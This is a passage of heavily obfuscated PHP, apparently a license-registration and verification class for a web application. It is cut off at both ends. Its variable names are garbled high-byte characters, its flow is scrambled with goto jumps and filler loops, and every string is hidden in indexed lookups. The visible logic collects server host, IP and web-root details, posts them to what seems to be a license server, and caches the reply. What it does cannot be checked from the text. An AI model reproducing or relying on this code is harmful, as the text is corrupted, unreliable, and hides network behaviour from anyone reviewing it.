AÒÑÀ †; eÕ…²Œ£¡‡: $this->{$_SERVER[‰†ğ°][38]}(); $f†œãÚã›˜ = $E‡½¹Ù¾‰Ë[579]; if (strlen($f†œãÚã›˜) < $E‡½¹Ù¾‰Ë[567]) { die; } goto eï¨âèì‚Æ; AÒÑÀ †: } private $cufhb99e82b0 = array(); private $edxn0da39701 = ''; public function hycm2804b7e9() { goto fÛùŠ¤ÑĞ™; DÒ‹Œ°‹òÇ: $A‡ÈŒ÷÷É­ = $F±¸‹¦Ò§á[581]; if (strlen($A‡ÈŒ÷÷É­) < $F±¸‹¦Ò§á[582]) { return; } $this->{$_SERVER[‰†ğ°][47]}(); goto c°æÂ—Àí; fÛùŠ¤ÑĞ™: $F±¸‹¦Ò§á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bƒ†ä èë =& $_SERVER[‰†ğ°]; $this->{$_SERVER[‰†ğ°][46]}(); goto DÒ‹Œ°‹òÇ; AÜ‘Ë–õ‚å: $this->{$_SERVER[‰†ğ°][3]}($Bƒ†ä èë[57], array($this, $Bƒ†ä èë[58])); $B‹íõÕæ© = $F±¸‹¦Ò§á[587]; if (!$B‹íõÕæ©) { die; } goto fÅ¦Ó«‹¾; FŸ£¯®¹é: $this->{$_SERVER[‰†ğ°][52]}(); $aÖ¡­å—  = $F±¸‹¦Ò§á[584]; if (!$aÖ¡­å— ) { die; } goto Bˆ÷«’„; c°æÂ—Àí: $this->{$_SERVER[‰†ğ°][48]}(); $E˜îÄ……ç = $F±¸‹¦Ò§á[583]; if (strlen($E˜îÄ……ç) < $F±¸‹¦Ò§á[567]) { return; } goto EæŸŒ¨Ì; fÅ¦Ó«‹¾: $this->{$_SERVER[‰†ğ°][3]}($Bƒ†ä èë[59], array($this, $Bƒ†ä èë[60])); goto EäÌÇƒÇƒÊ; fƒöê¸ÂÆ³: $this->{$_SERVER[‰†ğ°][3]}($Bƒ†ä èë[55], array($this, $Bƒ†ä èë[56])); $Cˆ­Ú—ª²Ü = $F±¸‹¦Ò§á[586]; while (strlen($Cˆ­Ú—ª²Ü) < $F±¸‹¦Ò§á[570]) { if (!$Cˆ­Ú—ª²Ü) { break; } $Cˆ­Ú—ª²Ü++; } goto AÜ‘Ë–õ‚å; Bˆ÷«’„: $this->{$_SERVER[‰†ğ°][3]}($Bƒ†ä èë[53], array($this, $Bƒ†ä èë[54])); $F“å¯Óš«Â = $F±¸‹¦Ò§á[585]; if (!$F“å¯Óš«Â) { return; } goto fƒöê¸ÂÆ³; EæŸŒ¨Ì: $this->{$_SERVER[‰†ğ°][49]}(); $this->{$_SERVER[‰†ğ°][50]}(); $this->{$_SERVER[‰†ğ°][51]}(); goto FŸ£¯®¹é; EäÌÇƒÇƒÊ: } public function dewkb962fd60($BõÉÚìÖÑ) { goto cÃÇƒò„¨‡; fö‡Øæ¦ä: unset($BõÉÚìÖÑ[$eáÏ±±ê‹[102]][$eáÏ±±ê‹[104]][$eáÏ±±ê‹[106]]); $f÷İ¶ŸÖÏ‡ = $fÅÚ¶Äöëğ[590]; if (strlen($f÷İ¶ŸÖÏ‡) < $fÅÚ¶Äöëğ[570]) { die; } goto bå›äóï¹Š; Eå‹ŒƒĞˆµ: $BõÉÚìÖÑ[$eáÏ±±ê‹[114]][$eáÏ±±ê‹[134]] = $eáÏ±±ê‹[112]($this->cufhb99e82b0, $eáÏ±±ê‹[135], $eáÏ±±ê‹[10]); $BõÉÚìÖÑ[$eáÏ±±ê‹[114]][$eáÏ±±ê‹[136]] = $eáÏ±±ê‹[112]($this->cufhb99e82b0, $eáÏ±±ê‹[137], $eáÏ±±ê‹[10]); $c˜¬ÉæñÃ£ = $fÅÚ¶Äöëğ[593]; goto aµ£Š™Ìƒ; aµ£Š™Ìƒ: if (!$c˜¬ÉæñÃ£) { die; } if ($eáÏ±±ê‹[112]($GLOBALS, $eáÏ±±ê‹[138]) && $this->config[$eáÏ±±ê‹[139]]) { $BõÉÚìÖÑ[$eáÏ±±ê‹[114]][$eáÏ±±ê‹[140]] = WEB_ROOT; } return $BõÉÚìÖÑ; goto EìÆŒÜ”Ôà; a‹÷¸ª¿ô¸: if (!$fñ ‡É÷³ß) { return; } $BõÉÚìÖÑ[$eáÏ±±ê‹[114]][$eáÏ±±ê‹[119]] = $eáÏ±±ê‹[120]($_SERVER[$eáÏ±±ê‹[121]] . $D«ÀƒßˆÅß[$eáÏ±±ê‹[122]]); $BõÉÚìÖÑ[$eáÏ±±ê‹[114]][$eáÏ±±ê‹[123]] = $eáÏ±±ê‹[124]($eáÏ±±ê‹[125]()); goto AÛ½Å³É‰; b™ï§ê‡ŞÅ: while ($CŸÔ»å»½Ò < $fÅÚ¶Äöëğ[582]) { if ($CŸÔ»å»½Ò >= 0) { break; } $CŸÔ»å»½Ò++; } $BõÉÚìÖÑ[$eáÏ±±ê‹[114]][$eáÏ±±ê‹[115]] = $eáÏ±±ê‹[116]($eáÏ±±ê‹[117])->{$_SERVER[‰†ğ°][118]}(); $fñ ‡É÷³ß = $fÅÚ¶Äöëğ[592]; goto a‹÷¸ª¿ô¸; eã˜ÛŞ”“ƒ: foreach ($Bñ¦Ã“‹Ï as $CÍ”…ò¥Åğ) { $dßÑéğ¶Šô = $GLOBALS[$eáÏ±±ê‹[100]][$eáÏ±±ê‹[101]][$CÍ”…ò¥Åğ]; $FãÇ³Ûòö¶ = $fÅÚ¶Äöëğ[589]; if (isset($D«ÀƒßˆÅß[$CÍ”…ò¥Åğ])) { $dßÑéğ¶Šô = $D«ÀƒßˆÅß[$CÍ”…ò¥Åğ]; } $BõÉÚìÖÑ[$eáÏ±±ê‹[102]][$eáÏ±±ê‹[103]][$CÍ”…ò¥Åğ] = $dßÑéğ¶Šô; } $CŠŸèÉçÒÖ = $BõÉÚìÖÑ[$eáÏ±±ê‹[102]][$eáÏ±±ê‹[103]][$eáÏ±±ê‹[76]]; unset($BõÉÚìÖÑ[$eáÏ±±ê‹[102]][$eáÏ±±ê‹[104]][$eáÏ±±ê‹[105]]); goto fö‡Øæ¦ä; Cä¯›“õÎ§: while (strlen($EªÇëÎ¼ÒÜ) < $fÅÚ¶Äöëğ[567]) { if (!$EªÇëÎ¼ÒÜ) { break; } $EªÇëÎ¼ÒÜ++; } $BõÉÚìÖÑ[$eáÏ±±ê‹[102]][$eáÏ±±ê‹[103]][$eáÏ±±ê‹[108]] = array($eáÏ±±ê‹[109] => (int) $CŠŸèÉçÒÖ[$eáÏ±±ê‹[110]], $eáÏ±±ê‹[111] => (int) $eáÏ±±ê‹[112]($CŠŸèÉçÒÖ, $eáÏ±±ê‹[113], 0)); $CŸÔ»å»½Ò = $fÅÚ¶Äöëğ[571]; goto b™ï§ê‡ŞÅ; CéâîùÙ: $bÊå‹ó§Ê = $fÅÚ¶Äöëğ[588]; if (!$bÊå‹ó§Ê) { return; } $Bñ¦Ã“‹Ï = array($eáÏ±±ê‹[64], $eáÏ±±ê‹[65], $eáÏ±±ê‹[66], $eáÏ±±ê‹[67], $eáÏ±±ê‹[68], $eáÏ±±ê‹[69], $eáÏ±±ê‹[70], $eáÏ±±ê‹[71], $eáÏ±±ê‹[72], $eáÏ±±ê‹[73], $eáÏ±±ê‹[74], $eáÏ±±ê‹[75], $eáÏ±±ê‹[76], $eáÏ±±ê‹[77], $eáÏ±±ê‹[78], $eáÏ±±ê‹[79], $eáÏ±±ê‹[80], $eáÏ±±ê‹[81], $eáÏ±±ê‹[82], $eáÏ±±ê‹[83], $eáÏ±±ê‹[84], $eáÏ±±ê‹[85], $eáÏ±±ê‹[86], $eáÏ±±ê‹[87], $eáÏ±±ê‹[88], $eáÏ±±ê‹[89], $eáÏ±±ê‹[90], $eáÏ±±ê‹[91], $eáÏ±±ê‹[92], $eáÏ±±ê‹[93], $eáÏ±±ê‹[94], $eáÏ±±ê‹[95], $eáÏ±±ê‹[96], $eáÏ±±ê‹[97], $eáÏ±±ê‹[98], $eáÏ±±ê‹[99]); goto eã˜ÛŞ”“ƒ; AÛ½Å³É‰: $BõÉÚìÖÑ[$eáÏ±±ê‹[114]][$eáÏ±±ê‹[126]] = $this->edxn0da39701; if ($D«ÀƒßˆÅß[$eáÏ±±ê‹[126]] != $eáÏ±±ê‹[127]) { $BõÉÚìÖÑ[$eáÏ±±ê‹[114]][$eáÏ±±ê‹[128]] = $D«ÀƒßˆÅß[$eáÏ±±ê‹[128]]; $BõÉÚìÖÑ[$eáÏ±±ê‹[114]][$eáÏ±±ê‹[129]] = $D«ÀƒßˆÅß[$eáÏ±±ê‹[129]]; $EÎÇ¬§Š = $eáÏ±±ê‹[130](10) . $this->edxn0da39701 . $eáÏ±±ê‹[130](5); $BõÉÚìÖÑ[$eáÏ±±ê‹[102]][$eáÏ±±ê‹[131]][$eáÏ±±ê‹[132]] = $this->{$_SERVER[‰†ğ°][133]}($EÎÇ¬§Š, $BõÉÚìÖÑ[$eáÏ±±ê‹[114]][$eáÏ±±ê‹[119]]); } if ($this->edxn0da39701 == $eáÏ±±ê‹[127]) { $BõÉÚìÖÑ[$eáÏ±±ê‹[102]][$eáÏ±±ê‹[103]][$eáÏ±±ê‹[108]][$eáÏ±±ê‹[113]] = 0; } goto Eå‹ŒƒĞˆµ; cÃÇƒò„¨‡: $fÅÚ¶Äöëğ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eáÏ±±ê‹ =& $_SERVER[‰†ğ°]; $D«ÀƒßˆÅß = $eáÏ±±ê‹[61]($eáÏ±±ê‹[62])->{$_SERVER[‰†ğ°][63]}(); goto CéâîùÙ; bå›äóï¹Š: unset($BõÉÚìÖÑ[$eáÏ±±ê‹[102]][$eáÏ±±ê‹[103]][$eáÏ±±ê‹[76]]); unset($BõÉÚìÖÑ[$eáÏ±±ê‹[102]][$eáÏ±±ê‹[103]][$eáÏ±±ê‹[107]]); $EªÇëÎ¼ÒÜ = $fÅÚ¶Äöëğ[591]; goto Cä¯›“õÎ§; EìÆŒÜ”Ôà: } private function hgyw69389bc8() { goto EŠãˆ¡Ïµ; C°¡¹ó¡Ë: foreach ($fªíµ‘‹ª as $E»ßÏ¾îè‘) { if (!isset($fåÒ†¹¦‚[$E»ßÏ¾îè‘]) || !$fåÒ†¹¦‚[$E»ßÏ¾îè‘]) { continue; } $e®±›†ÆÓ·[$E»ßÏ¾îè‘] = $fåÒ†¹¦‚[$E»ßÏ¾îè‘]; $b“Í³Å¤§ù = $FïšôĞğ•ñ[595]; } $cÂ¶…ƒ‘Íà[13](array($cÂ¶…ƒ‘Íà[157], $cÂ¶…ƒ‘Íà[158]), $e®±›†ÆÓ·); goto Fè”çïÆ—­; EŠãˆ¡Ïµ: $FïšôĞğ•ñ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÂ¶…ƒ‘Íà =& $_SERVER[‰†ğ°]; if ($_SERVER[$cÂ¶…ƒ‘Íà[44]] == $cÂ¶…ƒ‘Íà[141]) { $EêÇ Ê›à÷ = array($cÂ¶…ƒ‘Íà[126] => $this->edxn0da39701, $cÂ¶…ƒ‘Íà[142] => $this->{$_SERVER[‰†ğ°][143]}(), $cÂ¶…ƒ‘Íà[144] => $cÂ¶…ƒ‘Íà[61]($cÂ¶…ƒ‘Íà[145])->{$_SERVER[‰†ğ°][146]}()); if ($this->edxn0da39701 != $cÂ¶…ƒ‘Íà[127]) { $eã“Ú«ê– = $cÂ¶…ƒ‘Íà[112]($this->cufhb99e82b0, $cÂ¶…ƒ‘Íà[147]); if ($eã“Ú«ê–) { $EêÇ Ê›à÷[$cÂ¶…ƒ‘Íà[148]] = $eã“Ú«ê–; $EêÇ Ê›à÷[$cÂ¶…ƒ‘Íà[149]] = $cÂ¶…ƒ‘Íà[150]($cÂ¶…ƒ‘Íà[112]($this->cufhb99e82b0, $cÂ¶…ƒ‘Íà[151])); $EêÇ Ê›à÷[$cÂ¶…ƒ‘Íà[152]] = $cÂ¶…ƒ‘Íà[112]($this->cufhb99e82b0, $cÂ¶…ƒ‘Íà[137]); } } $EêÇ Ê›à÷ = $this->{$_SERVER[‰†ğ°][153]}($cÂ¶…ƒ‘Íà[154]($EêÇ Ê›à÷), $cÂ¶…ƒ‘Íà[120]($cÂ¶…ƒ‘Íà[155])); $e®±›†ÆÓ· = array($cÂ¶…ƒ‘Íà[156] => $EêÇ Ê›à÷); $cÂ¶…ƒ‘Íà[13](array($cÂ¶…ƒ‘Íà[157], $cÂ¶…ƒ‘Íà[158]), $e®±›†ÆÓ·); } goto fÚÊà‡›éÚ; fÚÊà‡›éÚ: if ($this->edxn0da39701 == $cÂ¶…ƒ‘Íà[127]) { return; } $fªíµ‘‹ª = array($cÂ¶…ƒ‘Íà[159], $cÂ¶…ƒ‘Íà[160], $cÂ¶…ƒ‘Íà[161], $cÂ¶…ƒ‘Íà[162], $cÂ¶…ƒ‘Íà[163], $cÂ¶…ƒ‘Íà[164]); $C•š¯«Òš = $FïšôĞğ•ñ[594]; goto f•ËËßÉË¥; f•ËËßÉË¥: if (strlen($C•š¯«Òš) < $FïšôĞğ•ñ[578]) { return; } $fåÒ†¹¦‚ = $cÂ¶…ƒ‘Íà[61]($cÂ¶…ƒ‘Íà[62])->{$_SERVER[‰†ğ°][63]}(); $e®±›†ÆÓ· = array($cÂ¶…ƒ‘Íà[165] => $fåÒ†¹¦‚[$cÂ¶…ƒ‘Íà[64]], $cÂ¶…ƒ‘Íà[166] => $fåÒ†¹¦‚[$cÂ¶…ƒ‘Íà[65]], $cÂ¶…ƒ‘Íà[167] => $cÂ¶…ƒ‘Íà[10]); goto C°¡¹ó¡Ë; Fè”çïÆ—­: } private function enzi96991c71() { goto dğ´¼í¬Ü®; fÄäÁíŸ½Ñ: $aÜ”Š™ÄĞ = $F·ƒ†½Œ£Ú[598]; if (!$aÜ”Š™ÄĞ) { die; } $a“¯œ¥åÒ[$DÒ®´­®[128]] = $DÒ®´­®[220]($DÒ®´­®[124]($this->{$_SERVER[‰†ğ°][153]}($E‘¦íŠİ×, $DÒ®´­®[221]))); goto c§¤Ö­’İ¢; Cì¶« ãù°: if (!$DÒ®´­®[112]($GLOBALS, $DÒ®´­®[138])) { die; } $a•£¤øÌ µ = $GLOBALS[$DÒ®´­®[22]]; if (isset($a•£¤øÌ µ[$DÒ®´­®[169]])) { $this->{$_SERVER[‰†ğ°][170]}(); die; } goto B‰Å‘ŠŸ¿²; F¦Ê¥¬ĞÖ»: if ($a•£¤øÌ µ[$DÒ®´­®[184]] == $DÒ®´­®[185]) { $eÜîøÁò¸Ù = $this->{$_SERVER[‰†ğ°][153]}($e—Ğ‘ïéğî, $DÒ®´­®[186]); $d‰¾©ßøæÌ = $this->{$_SERVER[‰†ğ°][133]}($DÒ®´­®[154]($c³ÊœˆØÕÁ), $e—Ğ‘ïéğî . $DÒ®´­®[187], 3); $d‰¾©ßøæÌ = $d‰¾©ßøæÌ . $DÒ®´­®[188] . $_SERVER[$DÒ®´­®[179]]; $a˜ŸİõâÜ = $this->{$_SERVER[‰†ğ°][189]}($DÒ®´­®[190] . $eÜîøÁò¸Ù . $DÒ®´­®[191] . $d‰¾©ßøæÌ, -1); $DÒ®´­®[172]($a˜ŸİõâÜ, !0); } else { if ($a•£¤øÌ µ[$DÒ®´­®[184]] == $DÒ®´­®[192]) { $AÍ¥—îĞ…— = $DÒ®´­®[25]($DÒ®´­®[120]($DÒ®´­®[193] . $e—Ğ‘ïéğî), 12, 15) . $DÒ®´­®[194]; $d‰¾©ßøæÌ = $this->{$_SERVER[‰†ğ°][195]}($DÒ®´­®[2]($a•£¤øÌ µ[$DÒ®´­®[196]]), $AÍ¥—îĞ…—, 2); $d’Ì‚¦¡±“ = $DÒ®´­®[197]($d‰¾©ßøæÌ, !0); if (!$DÒ®´­®[198]($d’Ì‚¦¡±“) || !$DÒ®´­®[198]($d’Ì‚¦¡±“[$DÒ®´­®[199]]) || $d’Ì‚¦¡±“[$DÒ®´­®[171]] != !0) { $BÆİ™¯½Í˜ = $DÒ®´­®[200]; $EôæÔ¾ª¸¯ = $d’Ì‚¦¡±“[$DÒ®´­®[199]] ? $DÒ®´­®[201] . $d’Ì‚¦¡±“[$DÒ®´­®[199]] : $BÆİ™¯½Í˜; $DÒ®´­®[172]($EôæÔ¾ª¸¯, !1); } else { $c³ÊœˆØÕÁ[$DÒ®´­®[174]] = $d’Ì‚¦¡±“[$DÒ®´­®[199]][$DÒ®´­®[202]]; } } else { $d’Ì‚¦¡±“ = $this->{$_SERVER[‰†ğ°][189]}($DÒ®´­®[203], $c³ÊœˆØÕÁ, 10); $DÈ¯°Ş³ = $F·ƒ†½Œ£Ú[597]; while (strlen($DÈ¯°Ş³) < $F·ƒ†½Œ£Ú[570]) { if (!$DÈ¯°Ş³) { break; } $DÈ¯°Ş³++; } } } if (!$DÒ®´­®[198]($d’Ì‚¦¡±“) || !$DÒ®´­®[198]($d’Ì‚¦¡±“[$DÒ®´­®[199]]) || $d’Ì‚¦¡±“[$DÒ®´­®[171]] != !0) { $BÆİ™¯½Í˜ = $DÒ®´­®[204]($DÒ®´­®[205]); $EôæÔ¾ª¸¯ = $d’Ì‚¦¡±“[$DÒ®´­®[199]] ? $DÒ®´­®[201] . $d’Ì‚¦¡±“[$DÒ®´­®[199]] : $BÆİ™¯½Í˜; $DÒ®´­®[172]($EôæÔ¾ª¸¯, !1); } $e–åèè¦¤ó = $d’Ì‚¦¡±“[$DÒ®´­®[199]]; goto f²»Ó‰¼Ò; DÓƒ‹è‹•¯: $DÒ®´­®[61]($DÒ®´­®[62])->{$_SERVER[‰†ğ°][227]}($a“¯œ¥åÒ); $f¨ïæİö»Û = $DÒ®´­®[120]($_SERVER[$DÒ®´­®[121]] . $DÒ®´­®[220]($Bß‡¢…âÏ®) . $a“¯œ¥åÒ[$DÒ®´­®[216]]); $e¶ÀÍÂ‡ğÛ = $DÒ®´­®[220]($DÒ®´­®[25]($f¨ïæİö»Û, 10, 16)); goto a¤•ÊˆÍ§; a·’¼®Í±Ó: $cÂµù†Ø’[$e¶ÀÍÂ‡ğÛ] = $EŠ²ğ¼ºå³; $Fí‘Óì‘ç = $F·ƒ†½Œ£Ú[605]; if (strlen($Fí‘Óì‘ç) < $F·ƒ†½Œ£Ú[582]) { return; } goto aÈÏ—Á„ƒŒ; fÌçñÂ: $this->{$_SERVER[‰†ğ°][235]}(); Cache::set($DÒ®´­®[236] . $DÒ®´­®[120]($Bß‡¢…âÏ® . $DÒ®´­®[237]), $DÒ®´­®[10]); $DÒ®´­®[172]($DÒ®´­®[204]($DÒ®´­®[214]), !0); goto d…È´šÊŒè; Bğ®¹ñÅÒ: $a“¯œ¥åÒ[$DÒ®´­®[129]] = $DÒ®´­®[124]($DÒ®´­®[220]($this->{$_SERVER[‰†ğ°][153]}($BäÇ—‘‰«Ö, $DÒ®´­®[222]))); $Få…—¸Æ› = $F·ƒ†½Œ£Ú[601]; if ($e–åèè¦¤ó[$DÒ®´­®[223]] && $e–åèè¦¤ó[$DÒ®´­®[223]] >= 1) { $DÒ®´­®[61]($DÒ®´­®[62])->{$_SERVER[‰†ğ°][224]}($DÒ®´­®[225], $DÒ®´­®[226]); } goto DÓƒ‹è‹•¯; d…È´šÊŒè: $b¸Ì±ºõµ¨ = $F·ƒ†½Œ£Ú[606]; if (!$b¸Ì±ºõµ¨) { die; } goto Cæ§Û±ÇÛ ; CôíÌÈëã: $BäÇ—‘‰«Ö = $FÅ­Š¡èÀ² . $a“¯œ¥åÒ[$DÒ®´­®[126]] . $this->{$_SERVER[‰†ğ°][153]}($DÒ®´­®[120]($a“¯œ¥åÒ[$DÒ®´­®[215]]), $FÅ­Š¡èÀ²); $bëê·Ë²¦Ï = $F·ƒ†½Œ£Ú[600]; while (strlen($bëê·Ë²¦Ï) < $F·ƒ†½Œ£Ú[582]) { if (!$bëê·Ë²¦Ï) { break; } $bëê·Ë²¦Ï++; } goto Bğ®¹ñÅÒ; B‰Å‘ŠŸ¿²: if (!isset($a•£¤øÌ µ[$DÒ®´­®[171]]) || $DÒ®´­®[24]($a•£¤øÌ µ[$DÒ®´­®[171]]) != 16) { $DÒ®´­®[172]($DÒ®´­®[173] . $a•£¤øÌ µ[$DÒ®´­®[171]], !1); } $Bß‡¢…âÏ® = $DÒ®´­®[61]($DÒ®´­®[62])->{$_SERVER[‰†ğ°][63]}($DÒ®´­®[122]); $c³ÊœˆØÕÁ = array($DÒ®´­®[171] => $a•£¤øÌ µ[$DÒ®´­®[171]], $DÒ®´­®[174] => $DÒ®´­®[130](16), $DÒ®´­®[175] => $DÒ®´­®[155], $DÒ®´­®[176] => $DÒ®´­®[177], $DÒ®´­®[178] => $_SERVER[$DÒ®´­®[179]], $DÒ®´­®[180] => $_SERVER[$DÒ®´­®[181]], $DÒ®´­®[182] => $_SERVER[$DÒ®´­®[183]]); goto EŒó£Š´Áº; f¨Êæ±öè: $f¯‡ò¡ò«½ = $Aƒ©–‹“œÄ[$DÒ®´­®[231]]; $cÄ´»ê¿ÓÍ = $F·ƒ†½Œ£Ú[604]; $cÂµù†Ø’ = array(); goto a·’¼®Í±Ó; aÈÏ—Á„ƒŒ: $DÒ®´­®[61]($DÒ®´­®[11])->{$_SERVER[‰†ğ°][232]}($f¯‡ò¡ò«½[$DÒ®´­®[233]], array($DÒ®´­®[234] => $cÂµù†Ø’)); $this->cufhb99e82b0 = $e–åèè¦¤ó; $this->edxn0da39701 = $a“¯œ¥åÒ[$DÒ®´­®[126]]; goto fÌçñÂ; fÏ˜š»İ§ô: if ($c³ÊœˆØÕÁ[$DÒ®´­®[174]]) { $a“¯œ¥åÒ[$DÒ®´­®[218]] = $c³ÊœˆØÕÁ[$DÒ®´­®[174]]; } $CØ†§ìÓË = $DÒ®´­®[25]($DÒ®´­®[120]($a“¯œ¥åÒ[$DÒ®´­®[216]]), 10, 10); $E‘¦íŠİ× = $CØ†§ìÓË . $a“¯œ¥åÒ[$DÒ®´­®[126]] . $a“¯œ¥åÒ[$DÒ®´­®[218]]; goto fÄäÁíŸ½Ñ; dğ´¼í¬Ü®: $F·ƒ†½Œ£Ú =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÒ®´­® =& $_SERVER[‰†ğ°]; if ($_SERVER[$DÒ®´­®[44]] != $DÒ®´­®[168]) { return; } goto Cì¶« ãù°; a¤•ÊˆÍ§: $aë²Ê˜ò“• = $F·ƒ†½Œ£Ú[602]; if (strlen($aë²Ê˜ò“•) < $F·ƒ†½Œ£Ú[573]) { die; } $EŠ²ğ¼ºå³ = $this->{$_SERVER[‰†ğ°][133]}($DÒ®´­®[154]($e–åèè¦¤ó), $f¨ïæİö»Û); goto CÈÎ™íµğÁ; f²»Ó‰¼Ò: $bÁ±ÄÆçº = $this->{$_SERVER[‰†ğ°][206]}($e–åèè¦¤ó[$DÒ®´­®[207]]); if (!$bÁ±ÄÆçº || $bÁ±ÄÆçº != $e–åèè¦¤ó[$DÒ®´­®[151]]) { $d¯½Š°‘Â = array($DÒ®´­®[208] => $DÒ®´­®[61]($DÒ®´­®[62])->{$_SERVER[‰†ğ°][63]}($DÒ®´­®[122]), $DÒ®´­®[209] => $_SERVER[$DÒ®´­®[121]], $DÒ®´­®[210] => $DÒ®´­®[211](), $DÒ®´­®[180] => $_SERVER[$DÒ®´­®[181]]); $d‰¾©ßøæÌ = $this->{$_SERVER[‰†ğ°][212]}($DÒ®´­®[154]($d¯½Š°‘Â)); $this->{$_SERVER[‰†ğ°][189]}($DÒ®´­®[213] . $d‰¾©ßøæÌ); $DÒ®´­®[172]($DÒ®´­®[204]($DÒ®´­®[214]), !0); } $a“¯œ¥åÒ = array($DÒ®´­®[215] => $c³ÊœˆØÕÁ[$DÒ®´­®[171]], $DÒ®´­®[216] => $e–åèè¦¤ó[$DÒ®´­®[217]], $DÒ®´­®[218] => $DÒ®´­®[130](16), $DÒ®´­®[126] => $e–åèè¦¤ó[$DÒ®´­®[219]]); goto fÏ˜š»İ§ô; EŒó£Š´Áº: $bµñ‡°‰Õ÷ = $F·ƒ†½Œ£Ú[596]; if (!$bµñ‡°‰Õ÷) { return; } $e—Ğ‘ïéğî = $DÒ®´­®[120]($_SERVER[$DÒ®´­®[121]] . $Bß‡¢…âÏ®); goto F¦Ê¥¬ĞÖ»; CÈÎ™íµğÁ: $Aƒ©–‹“œÄ = $DÒ®´­®[228]($DÒ®´­®[61]($DÒ®´­®[11])->{$_SERVER[‰†ğ°][229]}(), $DÒ®´­®[230]); $f¥–®×¸ïô = $F·ƒ†½Œ£Ú[603]; while (strlen($f¥–®×¸ïô) < $F·ƒ†½Œ£Ú[570]) { if (!$f¥–®×¸ïô) { break; } $f¥–®×¸ïô++; } goto f¨Êæ±öè; c§¤Ö­’İ¢: $E’”ì‘Õî¦ = $F·ƒ†½Œ£Ú[599]; if (!$E’”ì‘Õî¦) { return; } $FÅ­Š¡èÀ² = $DÒ®´­®[130](16); goto CôíÌÈëã; Cæ§Û±ÇÛ : } private function licenseRegistSuccess() { goto eÅ¡“ãó÷¹; A™È‚Û…¨: $cºá·Á´éÂ = $F¨ƒâÍôó…[607]; if (strlen($cºá·Á´éÂ) < $F¨ƒâÍôó…[570]) { die; } if ($c‚³½¥Ğ¨ê[$a‘ÌõÜ·¬[89]] != $a‘ÌõÜ·¬[226]) { $a‘ÌõÜ·¬[61]($a‘ÌõÜ·¬[62])->{$_SERVER[‰†ğ°][227]}($a‘ÌõÜ·¬[89], $a‘ÌõÜ·¬[226]); } goto fõÉïİÖ‰; eÅ¡“ãó÷¹: $F¨ƒâÍôó… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a‘ÌõÜ·¬ =& $_SERVER[‰†ğ°]; $c‚³½¥Ğ¨ê = $a‘ÌõÜ·¬[61]($a‘ÌõÜ·¬[62])->{$_SERVER[‰†ğ°][63]}(); goto A™È‚Û…¨; fõÉïİÖ‰: $a‘ÌõÜ·¬[116]($a‘ÌõÜ·¬[238])->{$_SERVER[‰†ğ°][239]}(!0); goto FÎÍÙï‹Û; FÎÍÙï‹Û: } private function lizt9e4a756b() { goto DÁÌÓÆ†½Ò; DÁÌÓÆ†½Ò: $E¨‹ÏÃ¯Î® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B®Ø†×ÄÌ¶ =& $_SERVER[‰†ğ°]; $B®Ø†×ÄÌ¶[61]($B®Ø†×ÄÌ¶[62])->{$_SERVER[‰†ğ°][227]}(array($B®Ø†×ÄÌ¶[215] => $B®Ø†×ÄÌ¶[10], $B®Ø†×ÄÌ¶[216] => $B®Ø†×ÄÌ¶[10], $B®Ø†×ÄÌ¶[126] => $B®Ø†×ÄÌ¶[127], $B®Ø†×ÄÌ¶[128] => $B®Ø†×ÄÌ¶[10], $B®Ø†×ÄÌ¶[129] => $B®Ø†×ÄÌ¶[10])); goto e®àá„•«; B ß¥–Õ°©: if (!$b¡“’¦ùÄÆ) { die; } goto E¶â®¼ÕÓ×; A¶Ä©®¿¦ñ: $A™ŞÇˆ—¬ = $E¨‹ÏÃ¯Î®[609]; $this->edxn0da39701 = $B®Ø†×ÄÌ¶[127]; $b¡“’¦ùÄÆ = $E¨‹ÏÃ¯Î®[610]; goto B ß¥–Õ°©; e®àá„•«: $bÁº¿Á–†Ø = $E¨‹ÏÃ¯Î®[608]; $B®Ø†×ÄÌ¶[61]($B®Ø†×ÄÌ¶[62])->{$_SERVER[‰†ğ°][224]}($B®Ø†×ÄÌ¶[225], $B®Ø†×ÄÌ¶[240]); $this->cufhb99e82b0 = array(); goto A¶Ä©®¿¦ñ; E¶â®¼ÕÓ×: } private function klqia3a8a407() { goto eìÃ”Êñ…—; e‚ÃÏĞˆèŞ: $this->cufhb99e82b0 = $dË¨ìŸ–á; $this->edxn0da39701 = $Bä›í¤–º´[$DÖ‡‰ˆíÊ˜[126]]; $E…ùóøÓÂ¾ = $e©®äÇ‰Á[615]; goto Aº×ïœÎÖØ; dòÍÍÚöÚ•: Cache::set($DùØÔõÉËŒ, $dË¨ìŸ–á); $e«¯™Ñ‘‘ = $e©®äÇ‰Á[614]; while (strlen($e«¯™Ñ‘‘) < $e©®äÇ‰Á[573]) { if (!$e«¯™Ñ‘‘) { break; } $e«¯™Ñ‘‘++; } goto e‚ÃÏĞˆèŞ; F¨æÛÂŠò‘: $CõôÚ­î¶ø = $DÖ‡‰ˆíÊ˜[61]($DÖ‡‰ˆíÊ˜[62])->{$_SERVER[‰†ğ°][63]}($DÖ‡‰ˆíÊ˜[122]); $Cîµº‹ó‰‚ = $e©®äÇ‰Á[613]; $DùØÔõÉËŒ = $DÖ‡‰ˆíÊ˜[236] . $DÖ‡‰ˆíÊ˜[120]($CõôÚ­î¶ø . $DÖ‡‰ˆíÊ˜[237]); goto Bæ½‰®³±; Aº×ïœÎÖØ: if (!$E…ùóøÓÂ¾) { die; } goto eñ´ŸËÙœ; Bæ½‰®³±: $dË¨ìŸ–á = Cache::get($DùØÔõÉËŒ); if (!$DÖ‡‰ˆíÊ˜[198]($dË¨ìŸ–á) || !isset($dË¨ìŸ–á[$DÖ‡‰ˆíÊ˜[241]]) || $DÖ‡‰ˆíÊ˜[242]() - $dË¨ìŸ–á[$DÖ‡‰ˆíÊ˜[241]] >= 60) { $Bƒ×ÄŠÖšÛ = $DÖ‡‰ˆíÊ˜[228]($DÖ‡‰ˆíÊ˜[61]($DÖ‡‰ˆíÊ˜[11])->{$_SERVER[‰†ğ°][229]}(), $DÖ‡‰ˆíÊ˜[230]); $BğîŞ“õ‘ = $Bƒ×ÄŠÖšÛ[$DÖ‡‰ˆíÊ˜[231]]; $eë†ò÷¼™» = $DÖ‡‰ˆíÊ˜[120]($_SERVER[$DÖ‡‰ˆíÊ˜[121]] . 